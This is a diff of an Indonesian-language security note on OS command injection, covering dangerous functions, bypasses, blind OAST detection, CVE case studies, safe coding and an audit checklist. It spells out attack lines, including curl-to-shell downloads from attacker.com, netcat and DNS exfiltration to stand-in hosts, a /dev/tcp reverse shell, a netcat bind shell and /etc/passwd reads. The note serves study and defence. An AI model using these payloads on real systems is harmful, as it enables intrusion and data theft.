@@ -1,23 +1,50 @@
 ---
-title: Command Injection
-tags: [security, web, exploitation]
-aliases: [command-injection]
+title: Command Injection — Deep Dive, Exploitation, and Defense
+tags: [security, web, exploitation, command-injection, rce]
+aliases: [command-injection, os-command-injection, shell-injection]
+status: pending
+created: 2026-08-15
+updated: 2026-08-15
+cssclasses: [wide-table]
 ---
-# Command Injection
 
-Injeksi perintah (OS Command Injection) terjadi saat input user diteruskan ke shell (system(), exec(), backticks, eval pada Python/Node) tanpa sanitasi. Contoh berbahaya: `os.system("ping " + user_input)`, `eval(user_expr)`, `subprocess.run(cmd + user, shell=True)`.
+> [!abstract] Command Injection (OS Command Injection) terjadi ketika aplikasi meneruskan input yang tidak disanitasi ke system shell, memungkinkan attacker mengeksekusi perintah OS tambahan — dampak akhirnya **Remote Code Execution (RCE)**: membaca file, drop reverse shell, atau pivot ke internal network. Catatan ini memetakan seluruh attack surface: injection points & dangerous functions per bahasa, payload dasar & shell metacharacters, teknik bypass (encoding, whitespace alternatif, newline, glob, filter bypass), deteksi blind injection via OAST, studi kasus CVE nyata 2016-2024, pola secure coding (parameterization, whitelist, least privilege), tooling detection (Commix, Burp, Nuclei, Interactsh), dan checklist audit untuk blue team. Melengkapi [[web-security-moc]] (peta keamanan web) dan berpasangan dengan [[reverse-shell-payloads-reference]] (payload post-exploitation) serta [[untrusted-artifact-analysis]] (analisis input tidak tepercaya).
 
-## Injection Points
+# Command Injection — Deep Dive 🎯
 
-| Layer | Contoh | Bahasa |
-|-------|--------|--------|
-| System call | `system()`, `popen()`, `exec()` | C, PHP, Python |
-| Shell passthrough | `Runtime.exec()`, `ProcessBuilder` tanpa array | Java |
+## Daftar Isi
+1. [[#1. Injection Points & Dangerous Functions]]
+2. [[#2. Payload Dasar]]
+3. [[#3. Bypass Techniques]]
+4. [[#4. Blind Command Injection — Detection via OAST]]
+5. [[#5. Command Injection vs Code Injection]]
+6. [[#6. Studi Kasus Nyata]]
+7. [[#7. Defense — Secure Coding Patterns]]
+8. [[#8. Detection & Testing Tools]]
+9. [[#9. Blue Team — Audit Checklist]]
+10. [[#10. Red Team Perspective]]
+11. [[#11. Referensi]]
+12. [[#12. Koneksi ke Vault]]
+
+Command Injection (OS Command Injection) terjadi ketika aplikasi meneruskan input yang tidak disanitasi ke system shell, memungkinkan attacker mengeksekusi perintah OS tambahan. Dampaknya: **Remote Code Execution (RCE)** — attacker bisa membaca file, drop reverse shell, atau pivot ke internal network.
+
+## 1. Injection Points & Dangerous Functions
 | Template engine | `{cmd}` di Jinja2/Twig tanpa sandbox | Python, PHP |
 | Deserialization | gadget chain → `Runtime.exec` | Java (ysoserial) |
 | Cron/API hook | parameter ke `nslookup`, `dig`, `ping` | Aplikasi apapun |
 
-## Payload Dasar
+| Layer | Fungsi Berbahaya | Bahasa |
+|-------|------------------|--------|
+| System call | `system()`, `popen()`, `exec()` | C, PHP, Python |
+| Shell passthrough | `Runtime.getRuntime().exec()` (string tunggal) | Java |
+| Child process | `child_process.exec()`, `execSync()` | Node.js |
+| Subprocess | `os.system()`, `subprocess.run(..., shell=True)`, `os.popen()` | Python |
+| PHP execution | `shell_exec()`, `system()`, `exec()`, `passthru()`, backticks | PHP |
+| Ruby | `` `cmd` ``, `system()`, `Kernel#exec` dengan interpolasi | Ruby |
+
+**Catatan:** Fungsi-fungsi di atas **exploitable by design** begitu input tidak terpercaya menyentuhnya.
+
+## 2. Payload Dasar
 
 ```bash
 ; id
@@ -29,117 +56,61 @@ ping 1.2.3.4 -n 1 & whoami
 '; cat /etc/passwd #
 ```
 
-## Bypass Teknik
+### Shell Metacharacters
 
-1. **Encoding** — URL encode (`%20`, `%0a`), double encoding, unicode (`%u0020`).
-2. **Whitespace alternatif** — `${IFS}`, tab, `$' '`, `{cat,/etc/passwd}`.
-3. **Newline injection** — payload di baris baru setelah parameter valid (`param=ok%0acat%20/etc/passwd`).
-4. **Wildcard/glob** — `/???/???t*` untuk mengurangi karakter yang diblokir.
-5. **Environment var** — `$PATH`, `$IFS`, `$()` chaining.
-6. **Filter bypass** — jika kata "cat" diblokir: `c''at`, `c$@at`, `ct`, `cat`.
+Shell interpreter memperlakukan karakter tertentu sebagai kontrol, bukan teks literal:
 
-## Deteksi & Pencegahan
+| Operator | Fungsi | Contoh Payload |
+|----------|--------|----------------|
+| `;` | Jalankan perintah berikutnya terlepas dari hasil pertama | `host=x; whoami` |
+| `&&` | Jalankan perintah berikutnya hanya jika pertama sukses | `host=x && curl evil.tld/x.sh\|sh` |
+| `||` | Jalankan perintah berikutnya hanya jika pertama gagal | `host=invalid \| id` |
+| `\|` | Pipe output perintah pertama ke perintah kedua | `host=x \| nc attacker.tld 4444` |
+| `` ` `` atau `$()` | Command substitution — output di-inline | `host=$(whoami)` |
+| `&` | Background process | `host=x & net user` |
+| `>` / `<` | Redirect output/input, bisa overwrite file | `host=x > /tmp/out` |
+| `#` | Comment — mengabaikan sisa command | `'; cat /etc/passwd #` |
 
-- **Gunakan API tanpa shell**: `subprocess.run([...])` dengan list argumen, bukan string + `shell=True`.
-- **Whitelist input**: hanya izinkan pola yang diharapkan (regex strict, bukan blacklist).
-- **Least privilege**: jalankan aplikasi dengan user non-root.
-- **WAF**: deteksi pattern `;|&|$()|\`\`` di parameter (CRS rule 932100-932260).
-- **Logging**: audit semua eksekusi perintah — deteksi anomali command line (Sysmon Event ID 1, EDR).
-- **Secure coding**: hindari shell wrapper ketika API native cukup.
+## 3. Bypass Techniques
 
-## Red Team Perspective
+### 3.1 Encoding
+- URL encode (`%20`, `%0a`)
+- Double encoding
+- Unicode (`%u0020`)
 
-Command injection sering jadi step: foothold → stable shell. Preferensi: reverse shell `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`, bind shell, atau out-of-band exfil via DNS (`curl http://attacker.collaborator.$(whoami).com`). Tooling: Burp Intruder (payload wordlist), commix (automasi), atau manual dengan netcat.
+### 3.2 Whitespace Alternatif
+- `${IFS}` (Linux)
+- Tab (`%09`)
+- `$' '`
+- `{cat,/etc/passwd}` (brace expansion)
 
-## Referensi
+### 3.3 Newline Injection
+Payload di baris baru setelah parameter valid: `param=ok%0acat%20/etc/passwd`
 
-- OWASP Command Injection Prevention Cheat Sheet
-- PayloadsAllTheThings — Command Injection
-- PortSwigger Web Security Academy — OS command injection lab
+### 3.4 Wildcard/Glob
+`/???/???t*` untuk mengurangi karakter yang diblokir
+
+### 3.5 Filter Bypass
+Jika kata "cat" diblokir:
+- `c''at`
+- `c$@at`
+- `c\at` (backslash)
+- `cat` (newline)
+- `tac` (reverse output)
 
 
+**Variasi tambahan:**
+- **Environment variable** — `$PATH`, `$IFS`, `$()` chaining untuk memecah filter.
+- **Custom fuzzing** — uji `%00`, `%0a`, UTF-16, double URL-encode; banyak WAF hanya normalize sekali.
 
-## Studi Kasus Nyata
-
-1. **CVE-2018-7600 (Drupalgeddon2)** — form API memanggil `passthru()` via user input; RCE pada jutaan situs Drupal. Pelajaran: parameterized execution wajib, bahkan di framework populer.
-2. **CVE-2021-44228 (Log4Shell)** — JNDI lookup memicu perintah eksternal; bukan command injection klasik tapi dampaknya setara RCE via aplikasi Java.
-3. **phpMyAdmin CVE-2016-5734** — parameter `pma_username` diteruskan ke `preg_replace` dengan flag `/e` → evaluasi kode. Pelajaran: fitur "elegant" (regex /e, eval) = permukaan serangan.
-
-## Blind Command Injection (Detection via Out-of-Band)
-
-Ketika output tidak terlihat, gunakan side channel:
-
+### 3.6 Command Chaining di Satu Input
+Attacker bisa konstruksi multi-stage payload dalam satu field:
 ```bash
-# Time-based
-payload=1; sleep 5
-# DNS exfil — setiap karakter dikirim sebagai subdomain
-curl http://$(hostname).attacker.com
-# Collaborator/Interactsh
-attacker$ collab: xyz.oastify.com → `nslookup xyz.oastify.com`
+; curl -s http://attacker.com/payload.sh | sh
 ```
 
-Tools untuk blind: Burp Collaborator, interactsh (ProjectDiscovery), OAST.
 
-## Command Injection vs Code Injection
-
-| Fitur | Command Injection | Code Injection |
-|-------|-------------------|----------------|
-| Eksekusi | Shell OS (sh, cmd) | Bahasa aplikasi (PHP eval, Python exec) |
-| Payload | `; id`, `$(cat /etc/passwd)` | `system('id')`, `__import__('os').system('id')` |
-| Contoh CVE | CVE-2018-7600 | phpMyAdmin preg_replace /e |
-| Impact | RCE (sama) | RCE (sama) |
-
-## Defense Code Patterns
-
-```python
-# BURUK — shell string concat
-cmd = "ping -c 1 " + user_input
-os.system(cmd)
-
-# BAIK — list args tanpa shell
-import subprocess
-subprocess.run(["ping", "-c", "1", user_input], shell=False)
-
-# JAVA
-ProcessBuilder("ping", "-c", "1", user_input)  // aman
-Runtime.getRuntime().exec("ping -c 1 " + input)  // RENTAN
-```
-
-```php
-// PHP — aman vs rentan
-$out = shell_exec("nslookup " . escapeshellarg($input)); // aman-ish
-$out = shell_exec("nslookup " . $input);  // RENTAN
-```
-
-## Automation Testing
-
-- **commix** — automasi command injection dengan deteksi waktu/error/out-of-band.
-- **Burp Intruder** — payload wordlist: `;id`, `|id`, `$(id)`, `` `id` ``, `%0aid`.
-- **Custom fuzzing** — masalah encoding: uji `%00`, `%0a`, UTF-16, double URL-encode.
-- **Nuclei template** — template command-injection untuk scan massal.
-
-## Checklist Audit
-
-- [ ] Semua eksekusi OS pakai parameterized/no-shell API?
-- [ ] Input user divalidasi whitelist (bukan blacklist)?
-- [ ] WAF rule CRS aktif (932xxx) dengan paranoia level sesuai?
-- [ ] Blind injection terdeteksi di log (out-of-band DNS)?
-- [ ] Aplikasi jalan dengan least privilege?
-
-
-
-## Blind Detection Commands (Linux/Windows)
-
-```bash
-# Linux — waktu (time-based)
-time curl -d "ip=127.0.0.1; sleep 5" http://target/ping
-# Windows
-ping -n 6 127.0.0.1 & whoami > C:\Windows\Temp\out.txt
-# OAST — Burp Collaborator / interactsh
-curl http://test.collaborator-domain.com
-```
-
-## Common Filter Bypass Table
+### 3.7 Common Filter Bypass Table
 
 | Filter | Bypass |
 |--------|--------|
@@ -149,14 +120,221 @@ curl http://test.collaborator-domain.com
 | Blokir `/` | `$(pwd)` + `cd`, `${PWD%/*}` |
 | Blokir kata kunci | concat via shell: `wh$(echo oami)` |
 
-## Eksekusi Remediasi / Blue Team
+## 4. Blind Command Injection — Detection via OAST
 
-- Batch hunt: cari `system(`, `exec(`, `shell_exec`, `Runtime.getRuntime`, `ProcessBuilder` di codebase (grep/SAST).
-- Review khusus: endpoint dengan input numeric/name yang masuk ke command (ping, nslookup, dig, ffmpeg, zip).
-- Runtime protection: seccomp/Landlock untuk proses aplikasi, AppArmor profile, container non-root.
-- Uji ulang setelah patch: regression test dengan payload dari CVE publik.
+Ketika output tidak terlihat, gunakan side channel:
+
+### Time-based
+```bash
+# Linux
+; sleep 5
+# Windows
+ping -n 6 127.0.0.1
+```
+
+### DNS Exfil
+```bash
+curl http://$(hostname).attacker.com
+nslookup $(whoami).attacker.com
+```
+
+### OAST dengan Interactsh
+```bash
+# Interactsh (ProjectDiscovery) — public OAST service
+nslookup xyz.oastify.com
+curl http://xyz.oastify.com/$(whoami)
+```
+
+Interactsh mendeteksi OOB callback termasuk command injection.
+
+### Tools untuk Blind Injection
+- **Burp Collaborator** (PortSwigger)
+- **Interactsh** (ProjectDiscovery)
+- **Commix** dengan deteksi time-based/out-of-band
+
+## 5. Command Injection vs Code Injection
+
+| Fitur | Command Injection | Code Injection |
+|-------|-------------------|----------------|
+| **Definisi** | Inject & execute system commands melalui input | Inject & execute arbitrary code dalam konteks bahasa pemrograman |
+| **Eksekusi** | Shell OS (`/bin/sh`, `cmd.exe`) | Runtime bahasa (PHP eval, Python exec, Java deserialization) |
+| **Payload** | `; id`, `$(cat /etc/passwd)` | `system('id')`, `__import__('os').system('id')` |
+| **Contoh CVE** | CVE-2018-7600 (Drupalgeddon2) | Log4Shell (JNDI injection) |
+| **Impact** | RCE — akses sistem | RCE — akses aplikasi |
+
+Perbedaan utama: Command injection mengeksekusi perintah sistem dengan **privilege user** aplikasi; Code injection mengeksekusi kode dalam **konteks aplikasi** itu sendiri.
+
+## 6. Studi Kasus Nyata
+
+### CVE-2018-7600 (Drupalgeddon2) — CVSS 9.8
+Drupal gagal mensanitasi input user sebelum di-merge ke form element render properties, memungkinkan attacker inject PHP callables yang dieksekusi oleh Render API. Versi rentan: Drupal 6.x, <7.58, 8.2.x, <8.3.9, <8.4.6, <8.5.1. Dampak: **unauthenticated RCE** pada jutaan situs.
+
+### CVE-2021-44228 (Log4Shell)
+Bukan command injection klasik, tapi JNDI lookup memicu remote code execution via JNDI injection. Dampak setara RCE pada aplikasi Java.
+
+### CVE-2016-5734 — phpMyAdmin
+Parameter `pma_username` diteruskan ke `preg_replace` dengan flag `/e` → evaluasi kode. Pelajaran: fitur "elegant" (regex `/e`, eval) = permukaan serangan.
+
+
+### CVE-2024-13985 — Dahua EIMS
+Command injection pada `capture_handle.action` interface, parameter `captureCommand` tanpa sanitasi, memungkinkan **unauthenticated** attacker mengeksekusi arbitrary system commands. CVSS: **10.0 Critical**.
+
+### CVE-2024-9042 — Kubernetes NodeLogQuery
+Command injection pada fitur NodeLogQuery Kubernetes (Windows node). Exploit menggunakan `$(oscommand)` sebagai pattern di endpoint `/logs/`.
+
+### CVE-2024-51378 — CyberPanel
+Pre-auth RCE via command injection pada endpoint `/dns/getresetstatus` dan `/ftp/getresetstatus`.
+
+### CVE-2024-8156 — AutoGPT
+Command injection pada `workflow-checker.yml`, input `github.head.ref` digunakan secara insecure, memungkinkan attacker inject arbitrary commands via branch name.
+
+## 7. Defense — Secure Coding Patterns
+
+### 7.1 Defense Option 1: Hindari OS Commands
+**Primary defense**: hindari memanggil OS commands langsung. Gunakan built-in library functions:
+
+| Task | Unsafe Pattern | Safe Alternative |
+|------|----------------|------------------|
+| Directory creation | `system("mkdir /dir_name")` | `mkdir()` native |
+| File operations | `system("cp src dest")` | File I/O APIs |
+| Network requests | `system("curl url")` | HTTP client libraries |
+| Archive operations | `system("tar -xzf file")` | Archive manipulation libraries |
+
+### 7.2 Defense Option 2: Parameterization + Input Validation
+Jika OS commands tidak bisa dihindari:
+
+**Layer 1 — Parameterization**:
+- Gunakan mekanisme structured yang memisahkan command dan data
+- Jangan gabungkan command dan arguments dalam satu string
+
+**Layer 2 — Input Validation**:
+- **Commands**: Whitelist perintah yang diizinkan
+- **Arguments**: Positive validation / whitelist regex
+
+Regex contoh: `^[a-z0-9]{3,10}$` — hanya huruf kecil dan angka, tanpa metacharacters.
+
+### 7.3 Code Examples — Safe vs Unsafe
+
+#### Python
+```python
+# ❌ UNSAFE — shell string concat
+os.system("ping -c 1 " + user_input)
+subprocess.run(f"ping -c 1 {user_input}", shell=True)  # shell=True = rentan
+
+# ✅ SAFE — list args tanpa shell
+import subprocess
+subprocess.run(["ping", "-c", "1", user_input], shell=False)
+```
+
+#### Java
+```java
+// ❌ UNSAFE — string tunggal
+Runtime.getRuntime().exec("ping -c 1 " + input);
+
+// ✅ SAFE — ProcessBuilder dengan args terpisah
+ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", input);
+```
+
+#### PHP
+```php
+// ❌ UNSAFE
+$out = shell_exec("nslookup " . $input);
+
+// ⚠️ AMAN-ish — escapeshellarg
+$out = shell_exec("nslookup " . escapeshellarg($input));
+```
+
+**Catatan**: `escapeshellarg()` mencegah command splitting tapi **tidak** mencegah argument injection.
+
+#### Node.js
+```js
+// ❌ UNSAFE
+const { exec } = require('child_process');
+exec(`ping -c 4 ${req.query.host}`, (err, stdout) => { ... });
+
+// ✅ SAFE — execFile dengan array args
+const { execFile } = require('child_process');
+execFile('ping', ['-c', '4', req.query.host], (err, stdout) => { ... });
+```
+
+### 7.4 Additional Defenses
+
+- **Least Privilege**: Aplikasi jalan dengan user non-root
+- **`--` delimiter**: POSIX Guideline 10 — `curl -- $url` treat everything after `--` as operands
+- **Seccomp/Landlock**: Runtime protection untuk proses aplikasi
+- **AppArmor/SELinux**: Container non-root
+
+## 8. Detection & Testing Tools
+
+### 8.1 Automation Tools
+
+| Tool | Fungsi |
+|------|--------|
+| **Commix** | Automates detection & exploitation of OS command injection |
+| **Burp Intruder** | Payload wordlist: `;id`, `|id`, `$(id)`, `` `id` ``, `%0aid` |
+| **Nuclei** | Template-based scanning — command-injection templates available |
+| **Interactsh** | OAST callback collector — DNS/HTTP interaction detection |
+
+### 8.2 Commix Usage
+```bash
+# Basic
+python commix.py -u "http://target/ping?ip=127.0.0.1" --data="ip=127.0.0.1"
+
+# Dengan cookie & proxy
+python commix.py -u "http://target/page" --cookie="session=abc" --proxy="http://127.0.0.1:8080"
+
+# OS command execution
+python commix.py -u "http://target/ping?ip=127.0.0.1" --os-cmd="whoami"
+```
+
+### 8.3 WAF Detection
+OWASP CRS (Core Rule Set) rules 932100-932260 untuk deteksi command injection pattern.
+
+## 9. Blue Team — Audit Checklist
+
+- [ ] Semua eksekusi OS pakai **parameterized/no-shell API**?
+- [ ] Input user divalidasi dengan **whitelist** (bukan blacklist)?
+- [ ] WAF rule CRS aktif (932xxx) dengan paranoia level sesuai?
+- [ ] Blind injection terdeteksi di log (out-of-band DNS)?
+- [ ] Aplikasi jalan dengan **least privilege**?
+- [ ] Codebase di-scan dengan SAST untuk fungsi berbahaya (`system(`, `exec(`, `Runtime.getRuntime`, `ProcessBuilder`)?
+
+## 10. Red Team Perspective
+
+Command injection sering jadi **foothold → stable shell**:
+
+- **Reverse shell**: `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`
+- **Bind shell**: `nc -lvp 4444 -e /bin/sh`
+- **Out-of-band exfil**: `curl http://attacker.collaborator.$(whoami).com`
+- **Tooling**: Burp Intruder, Commix, atau manual dengan netcat
+
+**Blue-side logging yang relevan:** audit semua eksekusi perintah — deteksi anomali command line (Sysmon Event ID 1, EDR telemetry).
+
 
 ---
 
-  audited
----
+## 11. Referensi
+
+- OWASP Command Injection Defense Cheat Sheet
+- OWASP Top 10 2021 — A03: Injection
+- PayloadsAllTheThings — Command Injection
+- PortSwigger Web Security Academy — OS command injection labs
+- Commix GitHub Repository
+- Interactsh — ProjectDiscovery
+- CVE-2018-7600 (Drupalgeddon2) — Metasploit module
+- CVE-2024-13985 — Dahua EIMS RCE
+- CVE-2024-9042 — Kubernetes NodeLogQuery RCE
+- phpMyAdmin CVE-2016-5734 — Metasploit module
+- CVE-2021-44228 (Log4Shell) — NVD
+
+
+## 12. Koneksi ke Vault
+
+| Catatan | Koneksi |
+|---------|---------|
+| [[web-security-moc]] | Peta utama keamanan web — command injection salah satu cabang attack class |
+| [[reverse-shell-payloads-reference]] | Payload post-exploitation setelah RCE tercapai |
+| [[untrusted-artifact-analysis]] | Analisis input tidak tepercaya — akar masalah injection |
+| [[ssrf-deep-dive]] | Serangan lain yang memanfaatkan input tidak tersanitasi |
+| [[directory-traversal-payload-collection]] | Payload traversal — sering dikombinasikan dengan injection |
+| [[http-parameter-pollution-deep-dive]] | Manipulasi parameter HTTP — teknik serupa di layer berbeda |
